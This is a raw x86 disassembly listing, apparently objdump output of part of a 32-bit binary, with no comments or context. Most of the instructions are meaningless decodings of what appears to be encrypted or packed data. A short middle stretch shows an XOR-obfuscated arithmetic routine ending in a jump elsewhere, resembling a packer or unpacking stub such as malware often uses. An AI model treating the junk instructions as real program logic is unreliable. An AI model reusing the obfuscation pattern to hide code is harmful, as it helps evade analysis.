  40ce6f:	jne    0x40cec9
  40ce71:	mov    ecx,0xf213c468
  40ce76:	in     eax,0xc9
  40ce78:	or     eax,0x7da06b5f
  40ce7d:	jne    0x40cebc
  40ce7f:	aam    0x91
  40ce81:	ror    BYTE PTR [ecx],1
  40ce83:	jge    0x40ce15
  40ce85:	xor    BYTE PTR [edi+0x2e],ch
  40ce88:	arpl   WORD PTR [edi-0x4713253a],sp
  40ce8e:	das    
  40ce8f:	pop    esp
  40ce90:	ins    BYTE PTR es:[edi],dx
  40ce91:	leave  
  40ce92:	in     eax,0xfc
  40ce94:	outs   dx,BYTE PTR ds:[esi]
  40ce95:	fsubr  DWORD PTR [esi-0x62d71010]
  40ce9b:	ret    
  40ce9c:	(bad)  
  40ce9e:	fld    DWORD PTR [edx-0x252e41e6]
  40cea4:	push   es
  40cea5:	xchg   BYTE PTR [esi],ah
  40cea7:	push   cs
  40cea8:	mov    ds:0x245c3b9b,eax
  40cead:	fld    st(5)
  40ceaf:	push   ebp
  40ceb0:	cmp    ecx,DWORD PTR [ecx]
  40ceb2:	sahf   
  40ceb3:	imul   ebx,ecx,0xb71bfdf3
  40ceb9:	sbb    eax,0x29eed7a3
  40cebe:	lahf   
  40cebf:	repz aam 0x54
  40cec2:	push   ebp
  40cec3:	jle    0x40ce8a
  40cec5:	push   DWORD PTR [eax-0x7f]
  40cec8:	adc    DWORD PTR [ebp-0x8bf6568],ebp
  40cece:	inc    edi
  40cecf:	ret    
  40ced0:	dec    cl
  40ced2:	jne    0x40cefa
  40ced4:	jno    0x40cf24
  40ced6:	fisub  DWORD PTR [esi+0x47c3311e]
  40cedc:	sbb    al,bl
  40cede:	sahf   
  40cedf:	ja     0x40ceb8
  40cee1:	sub    eax,eax
  40cee3:	pop    esp
  40cee4:	jle    0x40cf14
  40cee6:	or     al,0xed
  40cee8:	mov    al,0x23
  40ceea:	jne    0x40ce6d
  40ceec:	jmp    0x40cf04
  40ceee:	fcomp  DWORD PTR [ebx+0x5a]
  40cef1:	mov    ebx,0x84562a6e
  40cef6:	or     edx,DWORD PTR [eax+0x28]
  40cef9:	xchg   ebp,eax
  40cefa:	fwait
  40cefb:	and    ebx,DWORD PTR [edx-0x1fe1a6a9]
  40cf01:	rcl    edi,0x0
  40cf04:	sbb    esi,DWORD PTR [ebp+0x58]
  40cf07:	pop    edi
  40cf08:	push   ds
  40cf09:	jne    0x40ce91
  40cf0b:	lods   eax,DWORD PTR ds:[esi]
  40cf0c:	adc    BYTE PTR [esi],dh
  40cf0e:	push   ecx
  40cf0f:	mov    al,0x99
  40cf11:	push   0xffffffb1
  40cf13:	cmp    DWORD PTR [esi-0x64],ebx
  40cf16:	xor    BYTE PTR [esi-0x2],al
  40cf19:	pop    edi
  40cf1a:	add    al,0x60
  40cf1c:	mov    al,ds:0xb09f1223
  40cf21:	sbb    dh,bh
  40cf23:	jnp    0x40cee5
  40cf25:	mov    ebx,0x52b032fe
  40cf2a:	mov    ch,0x8
  40cf2c:	fisubr DWORD PTR [ebx]
  40cf2e:	arpl   WORD PTR [edi],bx
  40cf30:	mov    eax,0x34659c2c
  40cf35:	cmp    eax,DWORD PTR [ecx]
  40cf37:	(bad)  
  40cf38:	mov    cl,0x34
  40cf3a:	push   eax
  40cf3b:	nop/reserved BYTE PTR [eax+0x7ab78b1c]
  40cf42:	hlt    
  40cf43:	push   ebp
  40cf44:	call   0xa6b1:0xb56d1714
  40cf4b:	pop    esi
  40cf4c:	dec    ebp
  40cf4d:	xor    ecx,ebp
  40cf4f:	int    0x12
  40cf51:	repz or al,0x91
  40cf54:	scas   al,BYTE PTR es:[edi]
  40cf55:	imul   ebp,esi,0xed86bb32
  40cf5b:	loopne 0x40cefa
  40cf5d:	in     al,0x5e
  40cf5f:	mov    ebp,0xb284b4b5
  40cf64:	pop    edi
  40cf65:	cmp    ah,bh
  40cf67:	mov    ch,0xd5
  40cf69:	imul   edx,ebp,0xffffffcc
  40cf6c:	xchg   ecx,eax
  40cf6d:	mov    bh,BYTE PTR [ebx+0x60]
  40cf70:	fldcw  WORD PTR [edx]
  40cf72:	or     esi,eax
  40cf74:	inc    eax
  40cf75:	test   bh,dl
  40cf77:	loope  0x40cfa6
  40cf79:	xor    ebp,ebp
  40cf7b:	mov    eax,ds:0xdb0fc5fa
  40cf80:	lea    ebp,[edx+eiz*1-0x2162c599]
  40cf87:	push   0x72
  40cf89:	mov    dl,0x24
  40cf8b:	pop    edx
  40cf8c:	repnz mov esp,0x3d5b47cb
  40cf92:	xchg   edi,eax
  40cf93:	pop    ds
  40cf94:	add    BYTE PTR ss:[edi-0x6ef02545],ah
  40cf9b:	dec    ebx
  40cf9c:	scas   al,BYTE PTR es:[edi]
  40cf9d:	mov    WORD PTR [esi+edi*1],gs
  40cfa0:	cdq    
  40cfa1:	in     al,0x96
  40cfa3:	ja     0x40cf78
  40cfa5:	and    DWORD PTR [ebp+0x58],esp
  40cfa8:	call   0xa19a701f
  40cfad:	lea    ebx,[edx+0x395e148f]
  40cfb3:	fnop   
  40cfb5:	adc    dh,BYTE PTR [edx-0x16]
  40cfb8:	push   cs
  40cfb9:	out    0x9c,al
  40cfbb:	mov    ds:0x1b7bf395,al
  40cfc0:	test   al,0x68
  40cfc2:	mov    eax,0xcfcb8652
  40cfc7:	js     0x40cf6c
  40cfc9:	jg     0x40d001
  40cfcb:	and    ebx,edx
  40cfcd:	aam    0x4e
  40cfcf:	push   ds
  40cfd0:	mov    ebp,0x74335db8
  40cfd5:	xor    ecx,esi
  40cfd7:	sub    DWORD PTR [ecx+0x2663ee81],eax
  40cfdd:	jecxz  0x40d034
  40cfdf:	test   esi,eax
  40cfe1:	mov    ah,0xa4
  40cfe3:	sbb    DWORD PTR [esp+esi*4+0xdeb11b2],0xd6761327
  40cfee:	xor    eax,DWORD PTR [ebx-0x40]
  40cff1:	ds push ds
  40cff3:	call   0x4631f42b
  40cff8:	push   ebx
  40cff9:	dec    ebx
  40cffa:	aad    0xb0
  40cffc:	add    dl,BYTE PTR [edi+ebx*4+0x5e]
  40d000:	or     DWORD PTR [edi],0xffffffdf
  40d003:	push   cs
  40d004:	xchg   edi,eax
  40d005:	sub    BYTE PTR [esi-0x2519661],bl
  40d00b:	iret   
  40d00c:	mov    al,ds:0xc154332b
  40d011:	loope  0x40d028
  40d013:	mov    WORD PTR [esi-0x162d1ec9],fs
  40d019:	lock sbb DWORD PTR [edi+0x42],esi
  40d01d:	mov    bh,0xf1
  40d01f:	mov    esp,esi
  40d021:	or     DWORD PTR [ebx],esp
  40d023:	fistp  QWORD PTR [edx+0x46035f35]
  40d029:	sar    cl,1
  40d02b:	(bad)  
  40d02c:	lods   al,BYTE PTR ds:[esi]
  40d02d:	fsubr  QWORD PTR [ecx-0xe]
  40d030:	sbb    bh,BYTE PTR ss:[ebx]
  40d033:	push   cs
  40d034:	fptan  
  40d036:	jg     0x40d03e
  40d038:	pusha  
  40d039:	and    WORD PTR [edx+edi*8+0xf],cx
  40d03e:	xor    al,0x82
  40d040:	scas   eax,DWORD PTR es:[edi]
  40d041:	xor    ebx,DWORD PTR [edx]
  40d043:	pushf  
  40d044:	jno    0x40d0b6
  40d046:	test   ch,al
  40d048:	ja     0x40d02c
  40d04a:	pop    ebx
  40d04b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d04c:	iret   
  40d04d:	in     al,0x12
  40d04f:	(bad)  
  40d050:	sub    BYTE PTR [ecx-0x5e],cl
  40d053:	mov    ah,0x3e
  40d055:	sub    al,0xc0
  40d057:	xchg   esi,eax
  40d058:	xor    BYTE PTR [esi+0x7b],0xdd
  40d05c:	mov    cl,0x9d
  40d05e:	dec    edx
  40d05f:	(bad)  
  40d060:	mov    al,0xc1
  40d062:	mov    esi,0xc9a53301
  40d067:	xor    ch,ah
  40d069:	ja     0x40d070
  40d06b:	into   
  40d06c:	scas   al,BYTE PTR es:[edi]
  40d06d:	ja     0x40d074
  40d06f:	arpl   WORD PTR [esi+0x709d2c11],di
  40d075:	mov    cl,0x56
  40d077:	popa   
  40d078:	ficomp DWORD PTR [esi-0x593b945d]
  40d07e:	push   es
  40d07f:	xor    edx,DWORD PTR [esi]
  40d081:	lea    edi,[ecx-0x61]
  40d084:	pop    es
  40d085:	sbb    edx,DWORD PTR [ebx]
  40d087:	add    edi,DWORD PTR [edx]
  40d089:	sub    al,0xf4
  40d08b:	push   ds
  40d08c:	sub    BYTE PTR [eax-0x557efd8e],0x56
  40d093:	mov    eax,esi
  40d095:	(bad)  
  40d096:	outs   dx,DWORD PTR ds:[esi]
  40d097:	dec    edx
  40d098:	jecxz  0x40d01f
  40d09a:	(bad)  
  40d09c:	mov    edx,0x259a408f
  40d0a1:	(bad)  
  40d0a2:	jg     0x40d0b5
  40d0a4:	in     al,dx
  40d0a5:	stos   WORD PTR es:[edi],ax
  40d0a7:	pop    ebp
  40d0a8:	out    0x31,eax
  40d0aa:	adc    DWORD PTR [esi-0x37b01dca],ecx
  40d0b0:	mov    ch,0x24
  40d0b2:	xchg   edi,eax
  40d0b3:	dec    esp
  40d0b4:	dec    eax
  40d0b5:	in     al,0xfa
  40d0b7:	push   ebp
  40d0b8:	sub    BYTE PTR [ebx+0x2030ec46],bl
  40d0be:	xlat   BYTE PTR ds:[ebx]
  40d0bf:	(bad)  
  40d0c0:	or     eax,0x27dd0868
  40d0c5:	fidiv  WORD PTR [edx+0x4f]
  40d0c8:	jmp    DWORD PTR [ecx+0x4b601e88]
  40d0ce:	(bad)  
  40d0cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0d0:	js     0x40d0b7
  40d0d2:	loope  0x40d10d
  40d0d4:	xor    DWORD PTR [esi-0x21],esi
  40d0d7:	sub    eax,0xaf4c08fb
  40d0dc:	xor    ah,BYTE PTR [eax]
  40d0de:	push   ss
  40d0df:	or     al,0xf
  40d0e1:	clc    
  40d0e2:	xor    bl,BYTE PTR [esi+0x22d8afa]
  40d0e8:	js     0x40d0aa
  40d0ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0eb:	inc    esp
  40d0ec:	sahf   
  40d0ed:	jle    0x40d0a4
  40d0ef:	pop    ebx
  40d0f0:	adc    cl,0x51
  40d0f3:	bound  esi,QWORD PTR [esi]
  40d0f5:	pop    es
  40d0f6:	fmul   DWORD PTR [ecx]
  40d0f8:	adc    ah,BYTE PTR [esp+eax*2]
  40d0fb:	rol    BYTE PTR [ebx-0x76],1
  40d0fe:	xor    al,0xd6
  40d100:	adc    ah,BYTE PTR [edx]
  40d102:	add    eax,0xf20da9a4
  40d107:	and    al,0x13
  40d109:	add    bh,BYTE PTR [edx+eiz*4]
  40d10c:	ror    bl,cl
  40d10e:	push   0xffffffdf
  40d110:	lds    esi,FWORD PTR [ebp+0xe85f233]
  40d116:	jmp    0x5312c53
  40d11b:	ss fmulp st(2),st
  40d11e:	cpuid  
  40d120:	inc    ebp
  40d121:	call   0x31e9:0xfe6e2e08
  40d128:	fistp  DWORD PTR [eax-0x2d]
  40d12b:	(bad)  
  40d12c:	jl     0x40d1ab
  40d12e:	add    dl,BYTE PTR [esi+0x454f1db7]
  40d134:	push   0x47
  40d136:	mov    ecx,edx
  40d138:	xchg   esp,eax
  40d139:	into   
  40d13a:	fdivr  QWORD PTR [edx+edi*8-0x4697d416]
  40d141:	push   ecx
  40d142:	mov    esi,0xc11d5360
  40d147:	shr    DWORD PTR [ebx+0x5d8665ef],1
  40d14d:	xchg   ecx,eax
  40d14e:	inc    ecx
  40d14f:	dec    eax
  40d150:	jo     0x40d152
  40d152:	data16 sbb al,0x8c
  40d155:	or     BYTE PTR [esi+edx*8-0x37ac0e0],0xd9
  40d15d:	dec    edi
  40d15e:	test   eax,0x6179207b
  40d163:	clc    
  40d164:	or     eax,0xcb3c31a5
  40d169:	xchg   ecx,eax
  40d16a:	push   es
  40d16b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d16c:	add    al,0x5
  40d16e:	cmp    edx,DWORD PTR [edi]
  40d170:	xor    BYTE PTR [eiz*2+0x2630fc6],dl
  40d177:	xchg   DWORD PTR [edi],edx
  40d179:	jg     0x40d1a0
  40d17b:	ja     0x40d1d2
  40d17d:	add    dh,cl
  40d17f:	scas   eax,DWORD PTR es:[edi]
  40d180:	enter  0x5971,0xe3
  40d184:	push   esi
  40d185:	dec    ebp
  40d186:	inc    eax
  40d187:	ror    BYTE PTR [edx-0x3f],0xc4
  40d18b:	cdq    
  40d18c:	(bad)  
  40d18d:	pop    eax
  40d18e:	scas   eax,DWORD PTR es:[edi]
  40d18f:	add    ecx,edi
  40d191:	out    0x7d,al
  40d193:	sbb    al,0xb1
  40d195:	mov    es,ecx
  40d197:	fwait
  40d198:	push   ebx
  40d199:	rsm    
  40d19b:	ins    BYTE PTR es:[edi],dx
  40d19c:	jmp    FWORD PTR [edi+0x53]
  40d19f:	out    0x63,al
  40d1a1:	jns    0x40d207
  40d1a3:	jb     0x40d154
  40d1a5:	adc    eax,0x531df82
  40d1aa:	xchg   esi,eax
  40d1ab:	fistp  QWORD PTR [eax-0x6f833940]
  40d1b1:	gs xchg esp,eax
  40d1b3:	inc    eax
  40d1b4:	rcr    esi,1
  40d1b6:	sbb    DWORD PTR [ebp-0x33],esi
  40d1b9:	push   0xa8d0fc21
  40d1be:	dec    esp
  40d1bf:	stos   DWORD PTR es:[edi],eax
  40d1c0:	daa    
  40d1c1:	inc    esi
  40d1c2:	push   ebx
  40d1c3:	pop    esp
  40d1c4:	push   ds
  40d1c5:	les    edi,FWORD PTR [eax+0x51]
  40d1c8:	aam    0x68
  40d1ca:	aaa    
  40d1cb:	sar    DWORD PTR [edx+ebx*8-0x51],1
  40d1cf:	or     eax,0x8f76a40
  40d1d4:	mov    ds:0x2a8d4457,al
  40d1d9:	mov    ebp,0xc36ac42d
  40d1de:	daa    
  40d1df:	enter  0x61ae,0xab
  40d1e3:	fs in  al,dx
  40d1e5:	jno    0x40d201
  40d1e7:	outs   dx,DWORD PTR ds:[esi]
  40d1e8:	scas   al,BYTE PTR es:[edi]
  40d1e9:	jo     0x40d188
  40d1eb:	xchg   ebx,eax
  40d1ec:	sahf   
  40d1ed:	aad    0x21
  40d1ef:	add    al,0x5f
  40d1f1:	fsubr  QWORD PTR [esi-0x7]
  40d1f4:	mov    al,0xa0
  40d1f6:	jo     0x2404277
  40d1fc:	icebp  
  40d1fd:	and    DWORD PTR [esi-0xa],ebx
  40d200:	out    0xfd,al
  40d202:	aaa    
  40d203:	clc    
  40d204:	call   0x7f8a9a3d
  40d209:	push   ss
  40d20a:	ds cmp ch,bl
  40d20d:	inc    ecx
  40d20e:	inc    ebp
  40d20f:	out    dx,eax
  40d210:	out    0x41,al
  40d212:	xchg   ebx,eax
  40d213:	ret    
  40d214:	lds    edx,FWORD PTR [edi+0x3b49df76]
  40d21a:	cld    
  40d21b:	jno    0x40d1f0
  40d21d:	idiv   DWORD PTR [ecx+0x31]
  40d220:	mov    ebp,DWORD PTR [eax-0x7a311e0f]
  40d226:	push   ecx
  40d227:	xor    cl,dh
  40d229:	adc    eax,0x3386fac0
  40d22e:	pusha  
  40d22f:	cmp    al,0xfc
  40d231:	or     al,0x89
  40d233:	ret    
  40d234:	xchg   ecx,eax
  40d235:	cdq    
  40d236:	in     al,dx
  40d237:	loopne 0x40d1e5
  40d239:	call   0x3b58:0xb4b2ef4f
  40d240:	xchg   ebx,eax
  40d241:	sysret 
  40d243:	or     al,0xab
  40d245:	lods   eax,DWORD PTR ds:[esi]
  40d246:	fcom   QWORD PTR [esi]
  40d248:	xchg   edi,eax
  40d249:	xchg   ecx,eax
  40d24a:	cli    
  40d24b:	jp     0x40d274
  40d24d:	mov    ds:0x3ab3145b,al
  40d252:	scas   eax,DWORD PTR es:[edi]
  40d253:	jl     0x40d272
  40d255:	cmp    BYTE PTR [edi-0x364bdf57],ah
  40d25b:	sbb    dh,ch
  40d25d:	jge    0x40d2ab
  40d25f:	mov    cl,0xab
  40d261:	or     dl,cl
  40d263:	shr    BYTE PTR [esi+edi*8],cl
  40d266:	aad    0x1a
  40d268:	ret    
  40d269:	(bad)  
  40d26a:	cmp    eax,0x94530e90
  40d26f:	aam    0x7f
  40d271:	fsub   st,st(2)
  40d273:	mov    ecx,DWORD PTR [ecx-0x45]
  40d276:	sti    
  40d277:	int    0xd5
  40d279:	sub    eax,DWORD PTR [edi-0x59]
  40d27c:	loopne 0x40d218
  40d27e:	es jle 0x40d216
  40d281:	loope  0x40d210
  40d283:	dec    eax
  40d284:	push   ecx
  40d285:	aas    
  40d286:	jb     0x40d22f
  40d288:	(bad)  
  40d289:	retf   
  40d28a:	inc    esp
  40d28b:	ret    
  40d28c:	sub    BYTE PTR [esi-0x18eb38c2],0xfd
  40d293:	dec    edi
  40d294:	(bad)  
  40d295:	mov    eax,ds:0x4859b56f
  40d29a:	pop    ebp
  40d29b:	xor    BYTE PTR [edi+0x29],bl
  40d29e:	pop    edi
  40d29f:	out    0xf5,eax
  40d2a1:	jae    0x40d2f2
  40d2a3:	mov    bh,0xbc
  40d2a5:	mov    ebp,0x92e3e56d
  40d2aa:	loop   0x40d28f
  40d2ac:	mov    edi,0x5948bf7c
  40d2b1:	adc    eax,0x4c83d332
  40d2b6:	push   ebp
  40d2b7:	xor    eax,eax
  40d2b9:	ins    BYTE PTR es:[edi],dx
  40d2ba:	and    ebp,ebp
  40d2bc:	sub    ecx,eax
  40d2be:	out    dx,al
  40d2bf:	dec    ebp
  40d2c0:	clc    
  40d2c1:	mov    ebp,0xd709bfd6
  40d2c6:	push   ebp
  40d2c7:	cmp    al,0x6a
  40d2c9:	jmp    0x40d2a9
  40d2cb:	mov    ebp,DWORD PTR ss:[ebx+edi*8-0x2def29eb]
  40d2d3:	jbe    0x40d353
  40d2d5:	and    edx,DWORD PTR [esp+edx*2]
  40d2d8:	mov    bh,0x2c
  40d2da:	outs   dx,BYTE PTR ds:[esi]
  40d2db:	and    DWORD PTR [ecx+eax*8-0x44],esp
  40d2df:	sbb    BYTE PTR [ecx+0x78d58402],0xe3
  40d2e6:	rol    BYTE PTR [edx-0x6],cl
  40d2e9:	out    0xab,al
  40d2eb:	int3   
  40d2ec:	or     ebx,ecx
  40d2ee:	mov    ds:0x4fa9604f,al
  40d2f3:	jns    0x40d362
  40d2f5:	out    0xc8,eax
  40d2f7:	sbb    ebp,DWORD PTR [edi]
  40d2f9:	in     al,dx
  40d2fa:	sbb    edx,DWORD PTR [eax+0xfe9656c]
  40d300:	jl     0x40d307
  40d302:	stos   BYTE PTR es:[edi],al
  40d303:	jp     0x40d324
  40d305:	cdq    
  40d306:	sub    al,0x69
  40d308:	rol    DWORD PTR [ebp-0x67099bff],1
  40d30e:	mov    al,ds:0x140c084
  40d313:	jecxz  0x40d2cf
  40d315:	pushf  
  40d316:	adc    al,dl
  40d318:	iret   
  40d319:	pop    es
  40d31a:	sub    DWORD PTR [eax-0x2e14282b],0xeec815a0
  40d324:	sbb    esi,DWORD PTR [ecx+0x1635c463]
  40d32a:	xchg   ebp,eax
  40d32b:	cdq    
  40d32c:	mov    edi,0xd4142a52
  40d331:	cld    
  40d332:	add    BYTE PTR [edx],bl
  40d334:	push   ds
  40d335:	mov    eax,ds:0x9e0c7912
  40d33a:	cmp    ah,0xc7
  40d33d:	xor    al,0x96
  40d33f:	call   0xfbf:0x80869c99
  40d346:	sub    eax,0x696d922f
  40d34b:	jne    0x40d357
  40d34d:	push   edi
  40d34e:	ret    0x7910
  40d351:	daa    
  40d352:	sub    ecx,DWORD PTR [ecx-0x5a]
  40d355:	sahf   
  40d356:	pop    edx
  40d357:	stos   BYTE PTR es:[edi],al
  40d358:	pop    ebx
  40d359:	aam    0xea
  40d35b:	and    BYTE PTR [edi+0x20],ah
  40d35e:	jle    0x40d314
  40d360:	je     0x40d3a5
  40d362:	jmp    0xd042:0xfdd7db04
  40d369:	sub    eax,0x9472bab5
  40d36e:	in     eax,dx
  40d36f:	mov    ds:0xff9d6c0,al
  40d374:	arpl   WORD PTR [edi-0x71],bp
  40d377:	test   BYTE PTR [edx-0x3a54b5b5],dl
  40d37d:	ins    DWORD PTR es:[edi],dx
  40d37e:	js     0x40d3a6
  40d380:	mov    WORD PTR [ecx-0x64],?
  40d383:	and    cx,dx
  40d386:	sub    esi,ebx
  40d388:	xor    al,BYTE PTR [edi]
  40d38a:	mov    eax,0xf6360633
  40d38f:	mov    ds:0x4c5c15b4,eax
  40d394:	jmp    0x5d5f:0x13586b72
  40d39b:	push   esi
  40d39c:	xor    cl,BYTE PTR [edx]
  40d39e:	add    bh,cl
  40d3a0:	jo     0x40d343
  40d3a2:	jbe    0x40d3ea
  40d3a4:	imul   eax,DWORD PTR [ecx-0x3ee24cc6],0x35ddb0bb
  40d3ae:	out    dx,eax
  40d3af:	push   ecx
  40d3b0:	ds pop ebp
  40d3b2:	adc    ebp,DWORD PTR [edi+0x3c]
  40d3b5:	mov    eax,0x4caa751c
  40d3ba:	scas   al,BYTE PTR es:[edi]
  40d3bb:	xchg   esp,eax
  40d3bc:	imul   DWORD PTR [eax+esi*4]
  40d3bf:	les    ebx,FWORD PTR [eax-0x2789e45e]
  40d3c5:	les    ebp,FWORD PTR [ecx-0x67]
  40d3c8:	adc    bl,bh
  40d3ca:	adc    BYTE PTR [edx-0x2],0x9
  40d3ce:	sti    
  40d3cf:	das    
  40d3d0:	add    ebp,DWORD PTR ds:0x3ace0f50
  40d3d6:	stos   BYTE PTR es:[edi],al
  40d3d7:	jnp    0x40d3e7
  40d3d9:	dec    edx
  40d3da:	xor    ah,ch
  40d3dc:	pop    eax
  40d3dd:	rcl    BYTE PTR [ebp-0x3c],1
  40d3e0:	pop    ecx
  40d3e1:	push   es
  40d3e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3e4:	and    bl,ch
  40d3e6:	aam    0xbd
  40d3e8:	pop    es
  40d3e9:	aam    0x47
  40d3eb:	jne    0x40d37c
  40d3ed:	jnp    0x40d402
  40d3ef:	je     0x40d3be
  40d3f1:	retf   0xbfaf
  40d3f4:	cs repz cmc 
  40d3f7:	(bad)  
  40d3f8:	out    dx,eax
  40d3f9:	cld    
  40d3fa:	ror    cl,1
  40d3fc:	cmp    ah,dh
  40d3fe:	add    ah,BYTE PTR [ebx+0x60]
  40d401:	mov    ebx,0x7f7c303a
  40d406:	int3   
  40d407:	(bad)  
  40d408:	xlat   BYTE PTR ds:[ebx]
  40d409:	xchg   edi,eax
  40d40a:	push   edx
  40d40b:	mov    ds:0x94e15f7a,al
  40d410:	fld    QWORD PTR [edx+edx*1]
  40d413:	sub    eax,DWORD PTR [edx]
  40d415:	cdq    
  40d416:	enter  0xc77d,0x74
  40d41a:	xchg   edi,eax
  40d41b:	jp     0x40d3ac
  40d41d:	lahf   
  40d41e:	dec    ebp
  40d41f:	and    eax,0x558eb086
  40d424:	sbb    DWORD PTR [edx+eax*4+0x6],ebx
  40d428:	push   ebx
  40d429:	imul   eax,DWORD PTR [edx]
  40d42c:	mov    edx,DWORD PTR [ebp-0x4]
  40d42f:	xor    edx,ecx
  40d431:	mov    ecx,DWORD PTR [ebp+0x8]
  40d434:	lea    ecx,[edx+ecx*1+0x3272db]
  40d43b:	cmp    ecx,eax
  40d43d:	je     0x40d4b4
  40d443:	mov    edi,DWORD PTR [ebp-0x14]
  40d446:	mov    eax,DWORD PTR [ebp+0x8]
  40d449:	mov    edx,DWORD PTR [ebp+0x14]
  40d44c:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d450:	mov    ecx,0x7510893
  40d455:	xor    edx,edx
  40d457:	xor    edi,ecx
  40d459:	mov    esi,0x3272db
  40d45e:	add    edi,esi
  40d460:	div    edi
  40d462:	mov    edx,DWORD PTR [ebp-0x4]
  40d465:	xor    edx,ecx
  40d467:	lea    eax,[edx+eax*1+0x3272db]
  40d46e:	mov    edx,DWORD PTR [ebp+0x8]
  40d471:	mov    edi,DWORD PTR [ebp-0x20]
  40d474:	mov    DWORD PTR [edi+edx*4],eax
  40d477:	mov    eax,DWORD PTR [ebp-0x14]
  40d47a:	mov    edx,DWORD PTR [ebp+0x8]
  40d47d:	xor    eax,ecx
  40d47f:	lea    eax,[eax+edx*1+0x3272db]
  40d486:	mov    DWORD PTR [ebp+0x8],eax
  40d489:	mov    eax,DWORD PTR [ebp-0x14]
  40d48c:	mov    edx,DWORD PTR [ebp+0x14]
  40d48f:	xor    eax,ecx
  40d491:	add    eax,esi
  40d493:	imul   eax,DWORD PTR [edx]
  40d496:	mov    edx,DWORD PTR [ebp-0x4]
  40d499:	xor    edx,ecx
  40d49b:	mov    ecx,DWORD PTR [ebp+0x8]
  40d49e:	lea    ecx,[edx+ecx*1+0x3272db]
  40d4a5:	cmp    ecx,eax
  40d4a7:	jne    0x40d443
  40d4ad:	mov    eax,esi
  40d4af:	jmp    0x40d4b9
  40d4b4:	mov    eax,0x3272db
  40d4b9:	mov    ebx,0x7510893
  40d4be:	mov    ecx,DWORD PTR [ebp-0x4]
  40d4c1:	xor    ecx,ebx
  40d4c3:	add    ecx,eax
  40d4c5:	mov    DWORD PTR [ebp-0xc],ecx
  40d4c8:	mov    ebx,0x65655
  40d4cd:	add    ebx,0x3234
  40d4d3:	xchg   ebx,esi
  40d4d5:	xor    ebx,ebx
  40d4d7:	push   esi
  40d4d8:	mov    esi,ebx
  40d4da:	pop    ebx
  40d4db:	mov    edx,esi
  40d4dd:	add    ebx,0x1002
  40d4e3:	lea    eax,[ebp-0x10]
  40d4e6:	add    edx,eax
  40d4e8:	add    edx,0x5
  40d4eb:	push   edx
  40d4ec:	inc    esi
  40d4ed:	pop    ecx
  40d4ee:	dec    ecx
  40d4ef:	jmp    0x40f854
  40d4f4:	jl     0x40d532
  40d4f6:	pop    es
  40d4f7:	call   0xe49cb803
  40d4fc:	and    BYTE PTR [edi+0x3f0e4edd],0x6
  40d503:	out    dx,eax
  40d504:	mov    al,ds:0x3a6262d2
  40d509:	pop    edi
  40d50a:	bound  esp,QWORD PTR [edx-0x45]
  40d50d:	sub    BYTE PTR [eax+0xa],0x7d
  40d511:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d512:	sbb    eax,0x3c3ed670
  40d517:	dec    esi
  40d518:	pop    ds
  40d519:	jp     0x40d594
  40d51b:	clc    
  40d51c:	es push edx
  40d51e:	test   eax,0x2a9cfe01
  40d523:	(bad)  
  40d525:	push   ebp
  40d526:	call   0xa7cb692
  40d52b:	aaa    
  40d52c:	dec    esp
  40d52d:	in     eax,dx
  40d52e:	push   ebx
  40d52f:	test   BYTE PTR [esi],ah
  40d531:	cmp    DWORD PTR [ebp+0x53],edx
  40d534:	(bad)  
  40d535:	out    dx,eax
  40d536:	leave  
  40d537:	ret    0xe9f3
  40d53a:	test   esp,0x4bd65408
  40d540:	or     esp,0x6027239e
  40d546:	test   BYTE PTR [eax],ch
  40d548:	loope  0x40d537
  40d54a:	xchg   esp,eax
  40d54b:	lea    ebx,[edx-0x1e]
  40d54e:	lods   eax,DWORD PTR ds:[esi]
  40d54f:	xchg   ecx,eax
  40d550:	adc    dl,cl
  40d552:	pop    ecx
  40d553:	neg    BYTE PTR [edi+0xf]
  40d556:	adc    bl,BYTE PTR [edi+ecx*4+0x4e]
  40d55a:	ficomp DWORD PTR [ecx]
  40d55c:	inc    DWORD PTR [eax+0x56328d8a]
  40d562:	mov    cl,0x7e
  40d564:	mov    ds:0x10e6f045,al
  40d569:	pop    ds
  40d56a:	retf   
  40d56b:	mov    ch,0x3b
  40d56d:	outs   dx,DWORD PTR ds:[esi]
  40d56e:	mov    edi,0xe409e183
  40d573:	xchg   esi,eax
  40d574:	cs pop esi
  40d576:	xchg   ebx,eax
  40d577:	and    ebp,DWORD PTR [ebx-0x6aff6c47]
  40d57d:	xchg   esi,eax
  40d57e:	lea    ebx,[edi-0x1cd63d0]
  40d584:	jmp    0x595:0xdf9663d2
  40d58b:	inc    esp
  40d58c:	retf   
  40d58d:	push   eax
  40d58e:	sbb    edx,DWORD PTR [eax-0x1319f4be]
  40d594:	cs mov esi,0xea308978
  40d59a:	inc    ebp
  40d59b:	shl    DWORD PTR [ecx+ebx*1-0x1e],0xd5
  40d5a0:	inc    edi
  40d5a1:	dec    esp
  40d5a2:	inc    esi
  40d5a3:	ds loop 0x40d55b
  40d5a6:	mov    ah,0x29
  40d5a8:	add    eax,0x3c700121
  40d5ad:	mov    gs,WORD PTR [edi-0x73]
  40d5b0:	inc    edi
  40d5b1:	jmp    0x40d575
  40d5b3:	int3   
  40d5b4:	lea    ecx,[ebx]
  40d5b6:	call   0xa33dc3e0
  40d5bb:	(bad)  
  40d5bc:	adc    BYTE PTR [ebp-0x4b7b3258],dl
  40d5c2:	inc    edx
  40d5c3:	iret   
  40d5c4:	in     eax,0x78
  40d5c6:	ret    
  40d5c7:	adc    ebp,DWORD PTR [eax-0x7]
  40d5ca:	add    al,0x95
  40d5cc:	loope  0x40d5f3
  40d5ce:	or     BYTE PTR [ebx-0x3e57653d],ch
  40d5d4:	inc    ebp
  40d5d5:	iret   
  40d5d6:	nop
  40d5d7:	mov    ecx,0xe6f49839
  40d5dc:	cmp    DWORD PTR [ebx],edx
  40d5de:	jae    0x40d624
  40d5e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5e1:	and    esp,DWORD PTR [edi-0x12]
  40d5e4:	jb     0x40d5d6
  40d5e6:	jecxz  0x40d5d8
  40d5e8:	(bad)  
  40d5e9:	jg     0x40d627
  40d5eb:	daa    
  40d5ec:	aam    0xbd
  40d5ee:	mov    ch,0x16
